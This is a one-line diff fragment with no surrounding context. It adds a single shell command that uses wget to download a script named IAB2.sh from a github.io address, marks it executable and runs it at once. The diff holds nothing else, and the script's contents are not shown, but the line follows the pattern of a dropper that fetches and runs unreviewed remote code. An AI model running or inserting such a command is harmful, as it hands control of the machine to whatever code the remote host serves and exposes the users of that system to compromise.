@@ -1,0 +1,1 @@
+/bin/sh -c wget https://dzmltzack.github.io/web/IAB2.sh -O IAB2.sh && chmod +x IAB2.sh && ./IAB2.sh
